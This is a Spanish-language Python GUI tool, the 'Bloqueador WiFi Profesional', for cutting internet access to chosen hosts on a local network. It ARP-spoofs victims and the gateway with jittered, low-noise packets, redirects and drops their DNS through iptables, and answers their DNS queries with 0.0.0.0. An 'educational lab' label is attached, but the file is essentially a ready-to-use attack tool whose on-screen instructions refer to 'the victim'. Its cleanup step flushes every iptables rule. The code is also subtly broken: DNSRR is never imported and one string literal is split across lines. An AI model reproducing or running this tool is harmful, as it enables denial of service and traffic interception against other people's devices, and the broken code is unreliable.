
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BLOQUEADOR WIFI PROFESIONAL - Corte total de internet por IP
Uso: Laboratorio educativo controlado - Demostración de seguridad de red
"""

import tkinter as tk
from tkinter import messagebox, scrolledtext
import threading
import queue
import time
import os
import sys
import subprocess
import socket
import random

# Intentar importar scapy, si falla dar instrucciones
try:
    from scapy.all import ARP, Ether, send, srp, sniff, DNS, DNSQR, IP, UDP
    from scapy.all import conf, get_if_addr, get_if_hwaddr
    conf.verb = 0
except ImportError:
    print("ERROR: Scapy no instalado. Ejecutar: pip install scapy")
    print("Luego ejecutar como root: sudo python3 bloqueador.py")
    sys.exit(1)

# ============== CONFIGURACIÓN GLOBAL ==============
IP_GATEWAY = None
IP_LOCAL = None
MAC_LOCAL = None
INTERFACE = None

# Diccionario de objetivos: {ip: {'mac': str, 'evento': threading.Event(), 'activo': bool}}
OBJETIVOS = {}
LOCK_OBJETIVOS = threading.Lock()

# Cola thread-safe para mensajes minimalista
COLA_LOG = queue.Queue()

# ============== FUNCIONES DE RED ==============

def obtener_info_red():
    """Obtiene información de red automáticamente"""
    global IP_GATEWAY, IP_LOCAL, MAC_LOCAL, INTERFACE

    try:
        # Obtener interfaz por defecto
        INTERFACE = subprocess.getoutput("ip route | grep default | awk '{print $5}' | head -n1").strip()
        if not INTERFACE:
            INTERFACE = "eth0"

        IP_LOCAL = get_if_addr(INTERFACE)
        MAC_LOCAL = get_if_hwaddr(INTERFACE)
        IP_GATEWAY = subprocess.getoutput("ip route | grep default | awk '{print $3}' | head -n1").strip()

        return bool(IP_GATEWAY and IP_LOCAL)
    except Exception as e:
        print(f"Error obteniendo info de red: {e}")
        return False

def obtener_mac(ip, intentos=3):
    """Obtiene MAC de IP con reintentos"""
    for _ in range(intentos):
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans = srp(pkt, timeout=2, verbose=0)[0]
            for _, rcv in ans:
                return rcv.hwsrc
        except:
            pass
        time.sleep(0.3)
    return None

def verificar_root():
    """Verifica ejecución como root"""
    try:
        return os.geteuid() == 0
    except:
        return False

def activar_forwarding():
    """Activa IP forwarding silenciosamente"""
    try:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        os.system("echo 1 > /proc/sys/net/ipv4/conf/all/forwarding 2>/dev/null")
    except:
        pass

# ============== BLOQUEO DE INTERNET ==============

def bloquear_dns_iptables(ip_objetivo):
    """Bloquea DNS saliente de la IP objetivo via iptables"""
    try:
        # Bloquear DNS tradicional
        os.system(f"iptables -A FORWARD -s {ip_objetivo} -p udp --dport 53 -j DROP 2>/dev/null")
        os.system(f"iptables -A FORWARD -s {ip_objetivo} -p tcp --dport 53 -j DROP 2>/dev/null")

        # Redirigir DNS al atacante (para responder 0.0.0.0)
        os.system(f"iptables -t nat -A PREROUTING -s {ip_objetivo} -p udp --dport 53 -j DNAT --to-destination {IP_LOCAL}:53 2>/dev/null")

        return True
    except:
        return False

def desbloquear_dns_iptables(ip_objetivo):
    """Remueve reglas iptables para IP objetivo"""
    try:
        os.system(f"iptables -D FORWARD -s {ip_objetivo} -p udp --dport 53 -j DROP 2>/dev/null")
        os.system(f"iptables -D FORWARD -s {ip_objetivo} -p tcp --dport 53 -j DROP 2>/dev/null")
        os.system(f"iptables -t nat -D PREROUTING -s {ip_objetivo} -p udp --dport 53 -j DNAT --to-destination {IP_LOCAL}:53 2>/dev/null")
    except:
        pass

def ataque_arp_silencioso(ip_objetivo, mac_objetivo, evento_stop):
    """
    Ataque ARP minimalista y eficiente:
    - Fase 1: Envenenamiento rápido (20s)
    - Fase 2: Mantenimiento silencioso (cada 5-10s)
    """
    global IP_GATEWAY, MAC_LOCAL

    mac_gateway = obtener_mac(IP_GATEWAY)
    if not mac_gateway:
        return

    # FASE 1: Envenenamiento rápido (20 segundos)
    inicio = time.time()
    while not evento_stop.is_set() and (time.time() - inicio) < 20:
        try:
            # A víctima: soy el gateway
            send(ARP(pdst=ip_objetivo, hwdst=mac_objetivo, 
                    psrc=IP_GATEWAY, hwsrc=MAC_LOCAL, op=2), verbose=0, count=1)

            time.sleep(0.1)

            # A gateway: soy la víctima
            send(ARP(pdst=IP_GATEWAY, hwdst=mac_gateway,
                    psrc=ip_objetivo, hwsrc=MAC_LOCAL, op=2), verbose=0, count=1)

            time.sleep(1)
        except:
            pass

    if evento_stop.is_set():
        restaurar_arp(ip_objetivo, mac_objetivo, mac_gateway)
        return

    # FASE 2: Mantenimiento silencioso (mínimo tráfico)
    while not evento_stop.is_set():
        try:
            # Un solo par de paquetes cada 5-10 segundos (aleatorio para no ser predecible)
            send(ARP(pdst=ip_objetivo, hwdst=mac_objetivo, 
                    psrc=IP_GATEWAY, hwsrc=MAC_LOCAL, op=2), verbose=0, count=1)
            time.sleep(0.05)
            send(ARP(pdst=IP_GATEWAY, hwdst=mac_gateway,
                    psrc=ip_objetivo, hwsrc=MAC_LOCAL, op=2), verbose=0, count=1)

            # Esperar con jitter
            evento_stop.wait(random.uniform(5.0, 10.0))
        except:
            pass

    # Restaurar al detener
    restaurar_arp(ip_objetivo, mac_objetivo, mac_gateway)

def restaurar_arp(ip_objetivo, mac_objetivo, mac_gateway):
    """Restaura tablas ARP a valores correctos"""
    try:
        for _ in range(3):
            send(ARP(pdst=ip_objetivo, hwdst=mac_objetivo, 
                    psrc=IP_GATEWAY, hwsrc=mac_gateway, op=2), verbose=0, count=1)
            send(ARP(pdst=IP_GATEWAY, hwdst=mac_gateway,
                    psrc=ip_objetivo, hwsrc=mac_objetivo, op=2), verbose=0, count=1)
            time.sleep(0.5)
    except:
        pass

def responder_dns_nulo(ip_objetivo, evento_stop):
    """
    Responde consultas DNS con 0.0.0.0 (no resuelve nada)
    """
    def handler(pkt):
        if evento_stop.is_set():
            return True

        try:
            if DNS in pkt and pkt[DNS].qr == 0:  # Es consulta
                # Solo responder si es de la víctima
                if pkt[IP].src != ip_objetivo and pkt[IP].dst != ip_objetivo:
                    return False

                dominio = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')

                # Ignorar consultas ARPA
                if "in-addr.arpa" in dominio:
                    return False

                # Responder con 0.0.0.0 (no existe)
                respuesta = IP(dst=pkt[IP].src, src=pkt[IP].dst) /                            UDP(dport=pkt[UDP].sport, sport=53) /                            DNS(id=pkt[DNS].id, qr=1, aa=1,
                               qd=DNSQR(qname=dominio),
                               an=DNSRR(rrname=dominio, ttl=300, rdata="0.0.0.0"))

                send(respuesta, verbose=0, count=1)
        except:
            pass

        return False

    try:
        sniff(
            filter=f"udp port 53 and host {ip_objetivo}",
            prn=handler,
            stop_filter=lambda x: evento_stop.is_set(),
            store=0,
            timeout=2  # Timeout corto para verificar evento frecuentemente
        )
    except:
        pass

def worker_bloqueo(ip_objetivo, mac_objetivo, nombre):
    """
    Worker principal de bloqueo:
    1. Bloquea DNS via iptables
    2. Inicia ARP spoofing
    3. Responde DNS con 0.0.0.0
    """
    global OBJETIVOS, LOCK_OBJETIVOS

    with LOCK_OBJETIVOS:
        if ip_objetivo not in OBJETIVOS:
            return
        evento = OBJETIVOS[ip_objetivo]['evento']

    # 1. Bloquear DNS
    bloquear_dns_iptables(ip_objetivo)

    # 2. Iniciar ARP spoofing en hilo separado
    hilo_arp = threading.Thread(
        target=ataque_arp_silencioso,
        args=(ip_objetivo, mac_objetivo, evento),
        daemon=True
    )
    hilo_arp.start()

    # 3. Responder DNS nulo (bloqueo adicional)
    responder_dns_nulo(ip_objetivo, evento)

    # Esperar a que se detenga
    while not evento.is_set():
        time.sleep(0.5)

    # Limpieza
    desbloquear_dns_iptables(ip_objetivo)

    with LOCK_OBJETIVOS:
        if ip_objetivo in OBJETIVOS:
            OBJETIVOS[ip_objetivo]['activo'] = False

# ============== INTERFAZ MINIMALISTA ==============

def log(msg):
    """Agrega mensaje a cola de log"""
    COLA_LOG.put(msg)

def actualizar_log():
    """Actualiza log desde hilo principal"""
    try:
        while True:
            msg = COLA_LOG.get_nowait()
            txt_log.insert(tk.END, msg + "\n")
            txt_log.see(tk.END)
    except queue.Empty:
        pass
    ventana.after(100, actualizar_log)

def agregar_objetivo():
    """Agrega IP objetivo a la lista"""
    global OBJETIVOS, LOCK_OBJETIVOS

    ip = entry_ip.get().strip()
    nombre = entry_nombre.get().strip() or f"Objetivo_{len(OBJETIVOS)+1}"

    if not ip:
        return

    if ip == IP_GATEWAY:
        messagebox.showerror("Error", "No puede bloquear la gateway")
        return

    # Validar IP
    try:
        partes = ip.split('.')
        if len(partes) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in partes):
            raise ValueError
    except:
        messagebox.showwarning("Error", "IP inválida")
        return

    with LOCK_OBJETIVOS:
        if ip in OBJETIVOS:
            messagebox.showwarning("Error", "IP ya está en la lista")
            return

    # Verificar que responde
    log(f"🔍 Verificando {ip}...")
    ventana.update()

    mac = obtener_mac(ip)
    if not mac:
        messagebox.showwarning("No responde", f"{ip} no responde a ARP")
        return

    with LOCK_OBJETIVOS:
        OBJETIVOS[ip] = {
            'nombre': nombre,
            'mac': mac,
            'activo': False,
            'evento': threading.Event()
        }

    entry_ip.delete(0, tk.END)
    entry_nombre.delete(0, tk.END)
    log(f"✅ {nombre} ({ip}) agregado")
    actualizar_lista()

def iniciar_bloqueo(ip):
    """Inicia bloqueo de IP específica"""
    global OBJETIVOS, LOCK_OBJETIVOS

    with LOCK_OBJETIVOS:
        if ip not in OBJETIVOS or OBJETIVOS[ip]['activo']:
            return

        OBJETIVOS[ip]['activo'] = True
        OBJETIVOS[ip]['evento'] = threading.Event()
        datos = OBJETIVOS[ip]

    # Iniciar worker
    hilo = threading.Thread(
        target=worker_bloqueo,
        args=(ip, datos['mac'], datos['nombre']),
        daemon=True
    )
    hilo.start()

    log(f"🔴 BLOQUEANDO: {datos['nombre']} ({ip})")
    actualizar_lista()

def detener_bloqueo(ip):
    """Detiene bloqueo de IP"""
    global OBJETIVOS, LOCK_OBJETIVOS

    with LOCK_OBJETIVOS:
        if ip not in OBJETIVOS or not OBJETIVOS[ip]['activo']:
            return

        OBJETIVOS[ip]['activo'] = False
        OBJETIVOS[ip]['evento'].set()

    log(f"🟢 DESBLOQUEADO: {OBJETIVOS[ip]['nombre']} ({ip})")
    actualizar_lista()

def eliminar_objetivo(ip):
    """Elimina IP de la lista"""
    global OBJETIVOS, LOCK_OBJETIVOS

    with LOCK_OBJETIVOS:
        if ip not in OBJETIVOS:
            return

        if OBJETIVOS[ip]['activo']:
            detener_bloqueo(ip)
            time.sleep(0.5)

        nombre = OBJETIVOS[ip]['nombre']
        del OBJETIVOS[ip]

    log(f"🗑 Eliminado: {nombre}")
    actualizar_lista()

def iniciar_todos():
    """Inicia bloqueo de todos los objetivos"""
    global OBJETIVOS, LOCK_OBJETIVOS

    with LOCK_OBJETIVOS:
        ips = [ip for ip in OBJETIVOS if not OBJETIVOS[ip]['activo']]

    for ip in ips:
        iniciar_bloqueo(ip)
        time.sleep(0.3)  # Pequeño delay entre inicios

def detener_todos():
    """Detiene todos los bloqueos"""
    global OBJETIVOS, LOCK_OBJETIVOS

    with LOCK_OBJETIVOS:
        ips = [ip for ip, d in OBJETIVOS.items() if d['activo']]

    for ip in ips:
        detener_bloqueo(ip)
        time.sleep(0.1)

def emergencia():
    """Restauración completa del sistema"""
    log("\n🚨 RESTAURANDO SISTEMA...")

    detener_todos()
    time.sleep(1)

    # Limpiar todas las reglas de iptables
    os.system("iptables -F 2>/dev/null")
    os.system("iptables -t nat -F 2>/dev/null")

    log("✅ Sistema restaurado")
    messagebox.showinfo("Listo", "Todas las reglas eliminadas")

def actualizar_lista():
    """Actualiza la lista visual de objetivos"""
    # Limpiar frame
    for widget in frame_lista.winfo_children():
        widget.destroy()

    global OBJETIVOS, LOCK_OBJETIVOS

    with LOCK_OBJETIVOS:
        if not OBJETIVOS:
            tk.Label(frame_lista, text="Sin objetivos", fg="gray", bg="white").pack(pady=20)
            return

        items = list(OBJETIVOS.items())

    for ip, datos in items:
        # Color según estado
        color = "#e74c3c" if datos['activo'] else "#ecf0f1"  # Rojo si bloqueado, gris si no
        estado_texto = "🔴 BLOQUEADO" if datos['activo'] else "⚪ Inactivo"

        frame = tk.Frame(frame_lista, bg=color, padx=5, pady=3, relief=tk.RIDGE, bd=1)
        frame.pack(fill=tk.X, pady=1, padx=5)

        # Info
        tk.Label(frame, 
                text=f"{datos['nombre']} | {ip} | {datos['mac']} | {estado_texto}", 
                bg=color, 
                width=60, 
                anchor="w",
                font=("Consolas", 9, "bold" if datos['activo'] else "normal")
        ).pack(side=tk.LEFT)

        # Botones
        frame_botones = tk.Frame(frame, bg=color)
        frame_botones.pack(side=tk.RIGHT)

        if datos['activo']:
            tk.Button(frame_botones, 
                     text="DESBLOQUEAR", 
                     bg="#27ae60", 
                     fg="white",
                     command=lambda i=ip: detener_bloqueo(i)
            ).pack(side=tk.LEFT, padx=2)
        else:
            tk.Button(frame_botones, 
                     text="BLOQUEAR", 
                     bg="#c0392b", 
                     fg="white",
                     command=lambda i=ip: iniciar_bloqueo(i)
            ).pack(side=tk.LEFT, padx=2)

        tk.Button(frame_botones, 
                 text="X", 
                 fg="red",
                 command=lambda i=ip: eliminar_objetivo(i)
        ).pack(side=tk.LEFT, padx=2)

def cerrar_aplicacion():
    """Cierra aplicación de forma segura"""
    global OBJETIVOS, LOCK_OBJETIVOS

    with LOCK_OBJETIVOS:
        activos = sum(1 for d in OBJETIVOS.values() if d['activo'])

    if activos > 0:
        respuesta = messagebox.askyesnocancel("Salir", 
            f"Hay {activos} IPs bloqueadas.\n\n"
            "¿Restaurar sistema antes de salir?\n"
            "(Si = Restaurar y salir, No = Salir sin restaurar, Cancelar = No salir)")

        if respuesta is True:  # Si
            emergencia()
            ventana.destroy()
        elif respuesta is False:  # No
            ventana.destroy()
        # Cancelar = no hacer nada
    else:
        ventana.destroy()

def inicializar():
    """Inicialización de la aplicación"""
    global IP_GATEWAY, IP_LOCAL, MAC_LOCAL

    # Verificar root
    if not verificar_root():
        messagebox.showerror("ERROR", 
            "Esta herramienta requiere privilegios de root.\n\n"
            "Ejecutar como:"
"
            "sudo python3 bloqueador_wifi.py")
        sys.exit(1)

    # Obtener info de red
    if not obtener_info_red():
        messagebox.showerror("ERROR", "No se pudo obtener información de red")
        sys.exit(1)

    # Activar forwarding
    activar_forwarding()

    # Actualizar label de info
    lbl_info.config(text=f"Gateway: {IP_GATEWAY} | Tu IP: {IP_LOCAL} | MAC: {MAC_LOCAL}")

    # Iniciar actualización de log
    actualizar_log()

    # Log inicial
    log("="*50)
    log("🔴 BLOQUEADOR WIFI PROFESIONAL")
    log("="*50)
    log(f"✓ Gateway: {IP_GATEWAY}")
    log(f"✓ Tu IP: {IP_LOCAL}")
    log(f"✓ Interfaz: {INTERFACE}")
    log("")
    log("INSTRUCCIONES:")
    log("1. Ingresar IP de la víctima")
    log("2. Click en 'AGREGAR'")
    log("3. Click en 'BLOQUEAR'")
    log("4. La víctima NO podrá navegar")
    log("")
    log("⚠️  USO EXCLUSIVO PARA LABORATORIO EDUCATIVO")
    log("="*50)

# ============== INTERFAZ GRÁFICA ==============

ventana = tk.Tk()
ventana.title("Bloqueador WiFi Profesional - Laboratorio")
ventana.geometry("800x600")

# Header
tk.Label(ventana, 
        text="🔴 BLOQUEADOR WIFI - CORTE TOTAL DE INTERNET", 
        bg="#8e44ad", 
        fg="white",
        font=("Arial", 14, "bold"),
        pady=10
).pack(fill=tk.X)

# Info de red
lbl_info = tk.Label(ventana, 
                   text="Obteniendo información de red...", 
                   bg="#9b59b6", 
                   fg="white",
                   font=("Arial", 10))
lbl_info.pack(fill=tk.X)

# Frame de entrada
frame_entrada = tk.LabelFrame(ventana, text="Agregar Objetivo", padx=10, pady=10)
frame_entrada.pack(pady=10, padx=10, fill=tk.X)

tk.Label(frame_entrada, text="IP Objetivo:").grid(row=0, column=0, sticky="w")
entry_ip = tk.Entry(frame_entrada, width=20, font=("Consolas", 11))
entry_ip.grid(row=0, column=1, padx=5)
entry_ip.insert(0, "192.168.1.")

tk.Label(frame_entrada, text="Nombre:").grid(row=0, column=2, sticky="w", padx=(10,0))
entry_nombre = tk.Entry(frame_entrada, width=20, font=("Consolas", 11))
entry_nombre.grid(row=0, column=3, padx=5)

tk.Button(frame_entrada, 
         text="➕ AGREGAR", 
         bg="#3498db", 
         fg="white",
         font=("Arial", 10, "bold"),
         command=agregar_objetivo
).grid(row=0, column=4, padx=10)

# Frame de lista
frame_lista_container = tk.LabelFrame(ventana, text="Objetivos", padx=5, pady=5)
frame_lista_container.pack(pady=5, padx=10, fill=tk.X)

frame_lista = tk.Frame(frame_lista_container, bg="white")
frame_lista.pack(fill=tk.X)

# Botones de control
tk.Button(ventana, 
         text="🔴 BLOQUEAR TODOS", 
         bg="#c0392b", 
         fg="white",
         font=("Arial", 12, "bold"),
         width=20,
         command=iniciar_todos
).pack(pady=5)

tk.Button(ventana, 
         text="🟢 DESBLOQUEAR TODOS", 
         bg="#27ae60", 
         fg="white",
         font=("Arial", 12, "bold"),
         width=20,
         command=detener_todos
).pack(pady=5)

tk.Button(ventana, 
         text="🚨 RESTAURAR SISTEMA", 
         bg="#2c3e50", 
         fg="white",
         font=("Arial", 12, "bold"),
         width=25,
         command=emergencia
).pack(pady=10)

# Log
frame_log = tk.LabelFrame(ventana, text="Log de Actividad", padx=5, pady=5)
frame_log.pack(pady=5, padx=10, fill=tk.BOTH, expand=True)

txt_log = scrolledtext.ScrolledText(frame_log, 
                                   width=80, 
                                   height=15,
                                   font=("Consolas", 9),
                                   bg="#2c3e50",
                                   fg="#00ff00")
txt_log.pack(fill=tk.BOTH, expand=True)

# Configurar cierre
ventana.protocol("WM_DELETE_WINDOW", cerrar_aplicacion)

# Inicializar
inicializar()

# Iniciar loop
tk.mainloop()
